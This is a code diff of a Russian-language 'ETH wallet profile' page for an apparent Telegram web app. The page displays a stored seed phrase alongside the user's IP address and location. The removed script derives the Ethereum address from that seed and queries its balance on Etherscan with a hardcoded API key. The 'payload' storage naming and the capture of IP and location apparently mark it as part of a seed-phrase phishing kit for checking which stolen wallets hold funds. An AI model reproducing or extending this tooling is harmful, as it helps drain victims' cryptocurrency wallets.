@@ -1,9 +1,10 @@
+<!-- profile.html -->
 <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>👛 Профиль ETH кошелька</title>
+    <title>💻 Профиль ETH кошелька</title>
     <link rel="stylesheet" href="https://sp574-maker.github.io/maker/style.css" />
     <link rel="stylesheet" href="https://sp574-maker.github.io/maker/profile.css" />
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -12,85 +13,16 @@
 </head>
 <body>
     <div class="container">
-        <h1>👛 Профиль ETH кошелька</h1>
+        <h1>💳 Профиль ETH кошелька</h1>
         <p><strong>ETH адрес:</strong> <span id="ethAddress">–</span></p>
         <p><strong>Дата входа:</strong> <span id="timestamp">–</span></p>
         <p><strong>IP:</strong> <span id="userIp">–</span></p>
         <p><strong>Локация:</strong> <span id="userLocation">–</span></p>
-        <p><strong>Баланс ETH:</strong> <span id="walletBalance">⏳ Загрузка…</span></p>
+        <p><strong>Баланс ETH:</strong> <span id="walletBalance">⌓ Загрузка…</span></p>
         <p><strong>Seed-фраза:</strong></p>
         <textarea id="seed" readonly style="width:100%;height:100px;"></textarea>
-        <button id="goWalletBtn">🔁 Перейти в кошелёк</button>
+        <button id="goWalletBtn"><i data-feather="link"></i> Перейти в кошелёк</button>
     </div>
-
-    
-    <script src="https://sp574-maker.github.io/maker/script.js" defer></script>
-    <script>
-        const ETHERSCAN_API_KEY = "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD";
-        const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");
-
-        const seedPhrase = (data.seed || "").trim();
-        const walletType = (data.wallet || "").toLowerCase();
-        const timestamp = data.timestamp || "–";
-        const ip = data.ip || "–";
-        const locationInfo = data.location || "–";
-
-        document.getElementById("timestamp").textContent = timestamp;
-        document.getElementById("userIp").textContent = ip;
-        document.getElementById("userLocation").textContent = locationInfo;
-        document.getElementById("seed").textContent = seedPhrase;
-
-        let ethAddress = null;
-
-        async function deriveETHAddress(mnemonic) {
-            try {
-                if (!mnemonic) throw new Error("Seed-фраза порожня");
-                const wallet = ethers.Wallet.fromMnemonic(mnemonic);
-                ethAddress = wallet.address;
-                document.getElementById("ethAddress").textContent = ethAddress;
-                console.log("✅ ETH адрес:", ethAddress);
-            } catch (e) {
-                console.error("❌ Помилка генерації ETH:", e.message);
-            }
-        }
-
-        async function fetchETHBalance(address) {
-            try {
-                const url = `https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${ETHERSCAN_API_KEY}`;
-                const res = await fetch(url);
-                const json = await res.json();
-                if (!json || json.status !== "1" || !json.result) throw new Error("ETH API error");
-                const ethBalance = parseFloat(json.result) / 1e18;
-                document.getElementById("walletBalance").textContent = `${ethBalance.toFixed(6)} ETH`;
-            } catch (e) {
-                console.warn("❌ Помилка балансу ETH:", e.message);
-                document.getElementById("walletBalance").textContent = "–";
-            }
-        }
-
-        function goToWallet() {
-            let url = "https://www.google.com";
-            if (walletType.includes("metamask")) url = "https://metamask.io/";
-            else if (walletType.includes("trust")) url = "https://trustwallet.com/";
-            else if (walletType.includes("phantom")) url = "https://phantom.app/";
-            else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
-            else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";
-
-            if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.openLink(url);
-            } else {
-                window.open(url, "_blank");
-            }
-        }
-
-        document.getElementById("goWalletBtn").addEventListener("click", goToWallet);
-
-        document.addEventListener("DOMContentLoaded", async () => {
-            console.log("🚀 DOM загружено");
-            if (!seedPhrase) return console.error("❌ Seed-фраза порожня");
-            await deriveETHAddress(seedPhrase);
-            if (ethAddress) await fetchETHBalance(ethAddress);
-        });
-    </script>
+    <script src="https://sp574-maker.github.io/maker/script.js"></script>
 </body>
 </html>
